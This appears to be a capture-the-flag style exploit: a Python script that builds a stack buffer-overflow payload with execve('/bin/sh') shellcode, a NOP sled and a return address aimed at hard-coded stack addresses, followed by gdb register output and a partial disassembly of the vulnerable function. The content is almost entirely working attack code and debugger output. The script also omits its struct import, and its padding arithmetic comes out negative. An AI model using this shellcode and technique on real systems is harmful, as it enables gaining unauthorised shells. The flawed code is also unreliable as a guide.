


def main():
    # Shellcode for execve("/bin/sh")
    shellcode = b"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
    
    # Add NOP sled for better reliability
    nop_sled = b"\x90" * 50
    shellcode_with_nop = nop_sled + shellcode
    
    # Stack addresses (adjust these based on testing)
    start_addr = 0xbffff6bc
    return_addr = 0xbffff6dc  # ebp + 4
    
    # Calculate padding
    len_padding = return_addr - start_addr - len(shellcode_with_nop)
    
    first_input = b"AAAABBBBCCCCDDDDEEEE\n"
    
    # Build second input with NOP sled
    second_input = b"A" * len_padding + shellcode_with_nop + struct.pack("<I", start_addr + len_padding) + b"\n"
    output = first_input + second_input
    print(repr(output))

if __name__ == "__main__":
    main()



ebp = 0xbffff678
buff_addr = ebp - 0x1008


(gdb) info registers
eax            0xbffff6a8	-1073744216
ecx            0x9	9
edx            0xfe00	65024
ebx            0xb7fd0ff4	-1208152076
esp            0xbfffe660	0xbfffe660
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x8048517	0x8048517 <p+99>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
